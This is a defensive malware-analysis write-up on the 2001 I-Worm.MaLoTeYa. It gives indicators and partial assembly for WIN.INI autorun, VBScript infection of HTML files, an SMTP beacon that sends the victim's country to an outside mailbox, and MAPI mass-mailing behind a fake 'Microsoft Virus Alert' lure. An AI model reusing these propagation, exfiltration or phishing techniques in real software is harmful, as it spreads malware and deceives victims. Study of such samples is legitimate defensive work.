# Dissecting I‑Worm.MaLoTeYa: WIN.INI Autorun, HTML/VBScript Infection, SMTP + MAPI Spread 🛠️🔍

## Disclaimer
This article is for educational purposes only. The code and techniques discussed should not be used for malicious purposes.

## Introduction
I‑Worm.MaLoTeYa (July 2001) is a 32‑bit Windows worm written in assembly. It copies itself to `%WinDir%\\RUNW32.EXE` and `%System%\\MSVA.EXE`, persists via legacy WIN.INI, plants a Startup HTML page ("Virus Alert Registration") for social engineering, infects local HTML files by appending a VBScript that changes the IE start page, waits for connectivity, then spreads in two ways:
- SMTP: sends the user’s country to an external mailbox using a raw SMTP dialog.
- MAPI: scans Internet Explorer’s cache (`Temporary Internet Files`) for `mailto:` addresses and emails an attachment (`MSVA.EXE`) via Simple MAPI with a fake "Microsoft Virus Alert" message.

It also attempts Win9x "service process" hiding (broken by a typo) and, on Wednesdays, rewrites the title of the System Properties window with a brag message.

## Quick IOCs 🧭
- Files/artifacts
  - `%WinDir%\\RUNW32.EXE` (main autorun target)
  - `%System%\\MSVA.EXE` (secondary copy; used as email attachment)
  - Startup: `VARegistered.htm` (in user Startup folder)
  - `%WinDir%\\Carnet.txt` (not used here; distinct from Bush; present in some systems)
  - Appended VBScript marker in infected `.htm/.html`:
    - `document.Write "<font ...>This file is infected by my new virus ... HTML/W32.MaLoTeYa.Worm</font>"`
    - Registry write: `HKCU\Software\Microsoft\Internet Explorer\Main\Start Page = http://www.petikvx.fr.fm`
- Persistence
  - WIN.INI `[windows] run = %WinDir%\\RUNW32.EXE`
- Startup social‑engineering page
  - `VARegistered.htm` includes a form and VBScript validator; successful submit sets `action = "mailto:petik@multimania.com"`
- Email (MAPI)
  - Subject: `New Virus Alert !!`
  - Body: "This is a fix against I‑Worm.Magistr ... Run the attached file (MSVA.EXE)"
  - Attachment path: `%System%\\MSVA.EXE`
- SMTP beacons
  - Server: `obelisk.mpt.com.uk` (port 25)
  - From: `maloteya@petik.com`
  - To: `petik@multimania.com`
  - Subject: `Long Live the Worm`
  - Body includes `Pays d'origine : <country>` pulled from `WIN.INI [intl] sCountry`
- UI strings
  - MessageBox: "Microsoft Virus Alert" / "Your system does not appear infected with I‑Worm.Magistr"
  - Wednesday title hijack: window title set to "PetiK always is with you :-)"

## Section 2 – Source Code Analysis 🔬
The sample uses `useful.inc` for inline string macros like `@pushsz` and a lightweight `callx` import wrapper. File path buffers are short (50 bytes), so long Windows/System paths could truncate.

### Install, copy, and WIN.INI autorun
```asm
; Compose %WinDir%\RUNW32.EXE and %System%\MSVA.EXE
push 50h
push offset szOrig
push eax
callx GetModuleFileNameA

push 50h
push offset szCopie             ; Windows dir
callx GetWindowsDirectoryA
@pushsz "\\RUNW32.EXE"
push offset szCopie
callx lstrcat

push 50h
push offset szCopb              ; System dir
callx GetSystemDirectoryA
@pushsz "\\MSVA.EXE"
push offset szCopb
callx lstrcat

; If not already installed, copy both and set WIN.INI run
push offset szOrig
push offset szCopie
callx lstrcmp
jz   CACHE

push 0
push offset szCopie
push offset szOrig
callx CopyFileA
push 0
push offset szCopb
push offset szOrig
callx CopyFileA

push 50
push offset szWinini
callx GetWindowsDirectoryA
@pushsz "\\WIN.INI"
push offset szWinini
callx lstrcat
push offset szWinini
push offset szCopie
@pushsz "run"
@pushsz "windows"
callx WritePrivateProfileStringA
```
- Two copies: `%WinDir%\\RUNW32.EXE` and `%System%\\MSVA.EXE`.
- Persistence via legacy WIN.INI `[windows] run` to the Windows‑directory copy.

### Startup HTML: `VARegistered.htm` (social engineering)
```asm
@pushsz "SHELL32.dll"
callx LoadLibraryA
@pushsz "SHGetSpecialFolderPathA"
callx GetProcAddress
push 0
push 07h                  ; CSIDL_STARTUP
push offset StartUp
push 0
call [getfolder]
@pushsz "\\VARegistered.htm"
push offset StartUp
callx lstrcat

; Create and write htmd
callx CreateFileA
callx WriteFile
```
- The page is a faux "Microsoft Virus Alert Registration" form. Its VBScript:
  - Validates presence of `@` in the email field.
  - On valid input, sets `formu.action = "mailto:petik@multimania.com"`.
- After creation, the worm sleeps for 1 second and shows a benign message box stating the system is not infected with Magistr.

### Win9x service process (broken)
```asm
@pushsz "KERMEL32.dll"          ; typo: should be KERNEL32.dll
callx GetModuleHandleA
@pushsz "RegisterServiceProcess"
callx GetProcAddress
jecxz D_INF                      ; likely zero due to bad module name
push 1
push 0
call ecx
```
- The misspelling prevents retrieving `RegisterServiceProcess`, so hiding as a service process on Win9x does not occur.

### HTML infection in the Windows directory
```asm
; CurrentDirectory = Windows
callx GetCurrentDirectoryA
callx SetCurrentDirectoryA

; For all *.htm* in the folder, append a VBScript tail
FindFirstFileA "*.htm*" → Search
call infect
...

infect:
  CreateFileA target (WRITE)
  SetFilePointer FILE_END, Dist (Dist=0 → EOF)
  WriteFile d_htm (VBScript tail)
  SetFileAttributes READONLY
```
- Appends `d_htm`, which:
  - Writes `HKCU\...\Internet Explorer\Main\Start Page = http://www.petikvx.fr.fm`.
  - Prints an infection banner in red with worm branding.
- Sets the file to READONLY afterward.

### Connectivity gate and country extraction
```asm
@pushsz "WININET.dll" → InternetGetConnectedState
loop until connected

; Read sCountry from WIN.INI [intl]
GetPrivateProfileStringA("intl","sCountry", ..., org_pays)
```

### SMTP beacon: country to external mailbox
```asm
WSAStartup(1.1)
gethostbyname "obelisk.mpt.com.uk" → ServIP
socket(AF_INET, SOCK_STREAM)
connect port 25

; select/recv loop, then send sequence from Send_M table:
HELO obelisk.mpt.com.uk
MAIL FROM:<maloteya@petik.com>
RCPT TO:<petik@multimania.com>
DATA
From: "MaLoTeYa",<maloteya@petik.com>
Subject: Long Live the Worm
Pays d'origine : <org_pays>
.
QUIT
```
- Raw SMTP over port 25 with basic 220/250/354 checks implied via the state machine.
- Practicality depends on outbound 25/tcp allowed and server availability.

### IE cache scan and MAPI mass‑mail
```asm
; Get Internet Cache path (CSIDL 0x20) and chdir
SHGetSpecialFolderPathA(NULL, Cache, 0x20, FALSE)
SetCurrentDirectoryA(Cache)

; Enumerate *.htm* and MapViewOfFile each; look for 'mailto:' and send
FindFirstFileA "*.htm*" → infect2

infect2:
  CreateFileMappingA + MapViewOfFile
  scan for 'mailto:'
  if address contains '@' and ends at space/quote → ENVOIE

ENVOIE:
  MAPISendMail(&Message)
```
- Message is pre‑initialized:
  - Subject: "New Virus Alert !!"
  - Body instructs the user to run `MSVA.EXE` to fix Magistr.
  - Attachment path (`AttachDesc`): `%System%\\MSVA.EXE`.

### Wednesday prank: system properties title
```asm
GetSystemTime
cmp wDayOfWeek, 3 (Wednesday)
FindWindowA("Propriétés Système") or ("System Properties")
SetWindowTextA("PetiK always is with you :-)")
```
- Loops trying the two localized titles and then sets the caption.

## Macros and utilities from `useful.inc` 🧩
- `@pushsz "text"`: inline strings via call/pop trick, used for API names, registry keys, and search markers like `mailto:`.
- `callx`: thin wrapper to invoke imported APIs with stdcall argument pushes.

## Defense and remediation 🛡️
- Legacy autoruns
  - Monitor and block changes to `WIN.INI` `[windows] run=`; remove `%WinDir%\\RUNW32.EXE` and `%System%\\MSVA.EXE`.
- Startup artifacts
  - Delete `VARegistered.htm` from each user’s Startup folder.
- HTML infection
  - Hunt for appended VBScript tail that writes IE Start Page and prints the MaLoTeYa banner; restore pages from clean backups.
  - Monitor for sudden READONLY attribute flips on many `.htm/.html` files.
- Browser/registry controls
  - Lock IE Start Page via policy; block VBScript in Local Machine/Internet zones (legacy).
- Email channels
  - Enforce Outlook Object Model Guard and block executable attachments; monitor `MAPISendMail` in non‑mail processes.
  - Block outbound SMTP (25/tcp) from endpoints; alert on connections to `obelisk.mpt.com.uk` or similar legacy hosts.
- Endpoint hardening
  - Run as standard user and apply allow‑listing to prevent writes to Windows/System directories and Startup.

## Technical notes (quirks/bugs) 🧪
- Win9x hiding is broken: uses `"KERMEL32.dll"` instead of `KERNEL32.dll`, so `RegisterServiceProcess` is never called.
- The very first `GetModuleFileNameA` call is incorrectly parameterized (push 0 then call); the second call uses three args—the first appears redundant.
- HTML file infection sets READONLY; may hinder further edits/cleanups.
- SMTP flow assumes reachable `obelisk.mpt.com.uk` and open port 25; commonly blocked.
- Short 50‑byte buffers for paths can truncate on unusual Windows/System path lengths.

## Conclusion
MaLoTeYa chains together classic early‑2000s moves: WIN.INI autorun, Startup HTML for social engineering, on‑disk HTML/VBScript infection that hijacks the IE homepage, a raw SMTP beacon, and a cache‑harvest + MAPI mailer with an enticing "Microsoft Virus Alert" lure. Its strings, files, and behaviors are deterministic, making it straightforward to detect and remediate. Modern controls around scripts, legacy autoruns, SMTP egress, and mail automation render this specimen ineffective on contemporary systems.
